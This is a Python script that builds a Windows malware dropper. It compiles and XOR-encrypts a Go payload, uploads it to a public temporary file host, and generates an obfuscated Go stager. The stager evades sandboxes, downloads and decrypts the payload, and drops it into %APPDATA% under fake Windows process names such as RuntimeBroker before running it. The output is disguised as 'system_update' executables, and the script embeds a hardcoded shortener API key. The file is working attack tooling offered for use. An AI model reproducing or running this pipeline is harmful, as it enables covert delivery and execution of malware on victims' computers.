#!/usr/bin/env python3
"""
Go Payload Builder — CLI-only, auto-builds main.go in current directory.

Generates a native Go stager binary (no PyInstaller, no PyArmor, no Python runtime).
Uses garble for compile-time obfuscation when available.
"""
import sys
import os
import subprocess
import tempfile
import requests
import random
import string
import shutil
import time

# Legitimate-looking drop filenames
DROP_NAMES = [
    "RuntimeBroker", "SearchIndexer", "SecurityHealthService",
    "WmiPrvSE", "CompatTelRunner", "MpCmdRun", "dllhost",
    "conhost", "sihost", "taskhostw", "ctfmon", "fontdrvhost",
    "WUDFHost", "DeviceCensus", "MusNotification",
]

# Realistic subdirs under %APPDATA%
DROP_SUBDIRS = [
    ("Microsoft", "Windows", "Themes"),
    ("Microsoft", "Windows", "Shell"),
    ("Microsoft", "Network"),
    ("Microsoft", "Crypto"),
    ("Microsoft", "Windows", "TextInput"),
]

# ============================================================
# Go stager template — stdlib only, no external dependencies
# Placeholders get replaced at generation time.
# ============================================================
STAGER_TEMPLATE = r'''package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
__SANDBOX_IMPORTS__	"time"
)

func fetch(url string) ([]byte, error) {
	c := &http.Client{Timeout: 30 * time.Second}
	r, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := c.Do(r)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func apply(data, key []byte) []byte {
	result := make([]byte, len(data))
	kl := len(key)
	for i, b := range data {
		result[i] = b ^ key[i%kl]
	}
	return result
}

func main() {
__SANDBOX_CHECKS__
	time.Sleep(__SLEEP_MS__ * time.Millisecond)

	raw, err := fetch(string([]byte{__URL_BYTES__}))
	if err != nil {
		return
	}

	out := apply(raw, []byte{__KEY_BYTES__})

	dp := filepath.Join(os.Getenv("APPDATA"), __DROP_PATH_ARGS__)
	os.MkdirAll(filepath.Dir(dp), 0755)
	if os.WriteFile(dp, out, 0755) != nil {
		return
	}

	exec.Command(dp).Start()
}
'''

SANDBOX_IMPORTS = '''\t"runtime"
'''

SANDBOX_CHECKS = '''\tif runtime.NumCPU() < 2 {
\t\treturn
\t}
'''


class LitterboxAPI:
    API_URL = "https://litterbox.catbox.moe/resources/internals/api.php"

    def __init__(self, retention="24h", retries=3, delay=5):
        self.retention = retention
        self.retries = retries
        self.delay = delay

    def upload(self, filepath):
        if not os.path.exists(filepath):
            raise FileNotFoundError(f"File not found: {filepath}")

        for attempt in range(self.retries):
            try:
                with open(filepath, 'rb') as f:
                    files = {'fileToUpload': f}
                    data = {'reqtype': 'fileupload', 'time': self.retention}
                    resp = requests.post(self.API_URL, data=data, files=files, timeout=60)
                    resp.raise_for_status()
                    result = resp.text.strip()
                    if result.startswith("http"):
                        return result
                    raise Exception(f"Invalid response: {result}")
            except Exception:
                if attempt < self.retries - 1:
                    time.sleep(self.delay)
                else:
                    raise
        raise Exception("Upload failed")


class URLShortener:
    @staticmethod
    def shorten(url):
        api = "https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten"
        headers = {
            "Content-Type": "application/json",
            "x-api-key": "listentosmokeforever"
        }
        try:
            resp = requests.post(api, json={"url": url}, headers=headers, timeout=15)
            resp.raise_for_status()
            return resp.json().get("raw_url", url)
        except Exception:
            return url


def log(msg, level="INFO"):
    prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]"}[level]
    print(f"{prefix} {msg}")


def xor_encode(data, key):
    key_bytes = key.encode('utf-8')
    return bytes(b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data))


def generate_key(length=32):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


# ================================================================
# STAGE 1 — Compile Go payload → XOR encrypt → upload
# ================================================================

def stage_compile_payload(raw_payload, enc_key, litterbox):
    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = os.path.join(tmpdir, "payload.go")
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(raw_payload)

        log("Initializing Go module...")
        subprocess.run(["go", "mod", "init", "payload"], cwd=tmpdir, capture_output=True)
        subprocess.run(["go", "get", "golang.org/x/sys/windows"], cwd=tmpdir, capture_output=True)
        subprocess.run(["go", "mod", "tidy"], cwd=tmpdir, capture_output=True)

        out_path = os.path.join(tmpdir, "payload.exe")
        env = os.environ.copy()
        env["GOOS"] = "windows"
        env["GOARCH"] = "amd64"
        env["CGO_ENABLED"] = "0"

        log("Compiling (GOOS=windows, stripped, windowsgui)...")
        build = subprocess.run(
            ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "payload.go"],
            cwd=tmpdir, capture_output=True, text=True, env=env
        )
        if build.returncode != 0:
            raise Exception(f"Go build failed:\n{build.stderr}")

        with open(out_path, "rb") as f:
            bin_data = f.read()
        log(f"Compiled binary: {len(bin_data)} bytes", "OK")

        bin_data = xor_encode(bin_data, enc_key)
        log("XOR encrypted payload", "OK")

        enc_path = os.path.join(tmpdir, "payload.bin")
        with open(enc_path, "wb") as f:
            f.write(bin_data)

        url = litterbox.upload(enc_path)
        log("Payload uploaded to staging", "OK")
        return url


# ================================================================
# STAGE 3 — Generate Go stager source code
# ================================================================

def stage_generate_stager(payload_url, xor_key, sandbox=True):
    drop_name = random.choice(DROP_NAMES) + ".exe"
    drop_subdir = random.choice(DROP_SUBDIRS)
    sleep_ms = random.randint(2000, 5000)

    # Encode strings as Go byte slice literals (no plaintext in binary)
    url_bytes = ", ".join(f"0x{b:02x}" for b in payload_url.encode('utf-8'))
    key_bytes = ", ".join(f"0x{b:02x}" for b in xor_key.encode('utf-8'))

    # Build filepath.Join arguments
    drop_parts = list(drop_subdir) + [drop_name]
    drop_path_args = ", ".join(f'"{p}"' for p in drop_parts)

    source = STAGER_TEMPLATE
    source = source.replace("__SANDBOX_IMPORTS__", SANDBOX_IMPORTS if sandbox else "")
    source = source.replace("__SANDBOX_CHECKS__", SANDBOX_CHECKS if sandbox else "")
    source = source.replace("__SLEEP_MS__", str(sleep_ms))
    source = source.replace("__URL_BYTES__", url_bytes)
    source = source.replace("__KEY_BYTES__", key_bytes)
    source = source.replace("__DROP_PATH_ARGS__", drop_path_args)

    tmpdir = tempfile.mkdtemp()
    src_path = os.path.join(tmpdir, "main.go")
    with open(src_path, "w", encoding="utf-8") as f:
        f.write(source)

    # Init module (stdlib only, no dependencies)
    subprocess.run(["go", "mod", "init", "stager"], cwd=tmpdir, capture_output=True)

    log(f"Stager generated (drop: {'/'.join(drop_subdir)}/{drop_name})", "OK")
    if sandbox:
        log("Sandbox evasion checks embedded (CPU count)", "OK")
    return tmpdir


# ================================================================
# STAGE 4 — Compile stager with garble (or go build fallback)
# ================================================================

def stage_compile_stager(stager_dir, output_name):
    if not output_name.endswith(".exe"):
        output_name += ".exe"

    out_path = os.path.join(os.getcwd(), output_name)
    env = os.environ.copy()
    env["GOOS"] = "windows"
    env["GOARCH"] = "amd64"
    env["CGO_ENABLED"] = "0"

    log("Compiling stager (stripped, windowsgui)...")
    build = subprocess.run(
        ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
        cwd=stager_dir, capture_output=True, text=True, env=env
    )

    if build.returncode != 0:
        raise Exception(f"Stager build failed:\n{build.stderr}")

    if os.path.exists(out_path):
        size = os.path.getsize(out_path)
        log(f"SUCCESS: {output_name} ({size:,} bytes)", "OK")
    else:
        log("Stager binary not found after build", "ERR")

    # Cleanup
    try:
        shutil.rmtree(stager_dir, ignore_errors=True)
    except Exception:
        pass


# ================================================================
# MAIN
# ================================================================

def main():
    go_file = os.path.join(os.getcwd(), "main.go")
    if not os.path.exists(go_file):
        log("main.go not found in current directory.", "ERR")
        sys.exit(1)

    with open(go_file, "r", encoding="utf-8") as f:
        raw_payload = f.read()
    log(f"Loaded payload: main.go ({len(raw_payload)} chars)", "OK")

    output_name = f"system_update_{random.randint(100, 999)}.exe"
    enc_key = generate_key()
    litterbox = LitterboxAPI(retention="24h")

    log(f"Output: {output_name}")
    log(f"XOR Key: {enc_key}")
    print()

    try:
        # STAGE 1: Compile Go payload, XOR encrypt, upload
        log("--- Stage 1: Compile & Encrypt Payload ---")
        payload_url = stage_compile_payload(raw_payload, enc_key, litterbox)

        # STAGE 2: Shorten URL
        log("\n--- Stage 2: Shorten Payload URL ---")
        short_url = URLShortener.shorten(payload_url)
        log("Shortened URL ready", "OK")

        # STAGE 3: Generate Go stager source
        log("\n--- Stage 3: Generate Go Stager ---")
        stager_dir = stage_generate_stager(payload_url, enc_key)  # use direct Litterbox URL, not short_url

        # STAGE 4: Compile stager (garble or go build)
        log("\n--- Stage 4: Compile Stager ---")
        stage_compile_stager(stager_dir, output_name)

        print()
        log("=== Pipeline Complete ===", "OK")
    except Exception as e:
        log(f"Stopped: {e}", "ERR")
        sys.exit(1)


if __name__ == "__main__":
    main()
